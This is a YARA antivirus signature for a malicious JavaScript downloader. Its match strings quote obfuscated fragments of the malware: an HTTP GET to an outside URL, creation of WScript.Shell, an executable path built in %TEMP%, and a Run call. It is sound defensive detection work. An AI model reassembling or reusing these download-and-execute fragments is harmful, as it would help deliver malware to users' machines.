rule sig_20160330_d4de2eb42fa9f05951337dde873e916f {
  meta:
    description = "datamaliciousorder - file 20160330_d4de2eb42fa9f05951337dde873e916f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "229806498a156d884f05e2abf7c3b3d23633b08355ce7c90d371b4db2410b750"

  strings:
    $s1  = "OL[R](\"GET\", \"http://abnreview.com.au/j7dsa\", false);" fullword ascii
    $s2  = "function Z(QC, P){K = K * 1; return QC - P;};" fullword ascii
    $s3  = "var AD = function A() {return WScript[R0](\"WScript\"+\".Shell\");}(), J = 11;" fullword ascii
    $s4  = "if (OL[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TO() {return AD[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"U8jwmtwaUI4vR.ex\" + \"e\";};" fullword ascii
    $s6  = "function CT(){return SE + \"\";};" fullword ascii
    $s7  = "function XQ(AZ){AD[\"Run\"](AZ, K, K);};" fullword ascii
    $s8  = "function N() {return ((N0 == true) && (N0 == D1)) ? 1 : K;};" fullword ascii
    $s9  = "function H(){return 22;};" fullword ascii
    $s10 = "}while (D0);" fullword ascii
    $s11 = "return Z(K0, A0);" fullword ascii
    $s12 = "var MS = new this[\"Date\"]();" fullword ascii
    $s13 = "function GJ()" fullword ascii
    $s14 = "function RR(D) {var FX = (1, 2, 3, 4, 5, D); return FX;};" fullword ascii
    $s15 = "function W(){return R0;};" fullword ascii
    $s16 = "N0 = true; " fullword ascii
    $s17 = "var N0 = false;" fullword ascii
    $s18 = "var JN = false;" fullword ascii
    $s19 = "var D1 = false;" fullword ascii
    $s20 = "D1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}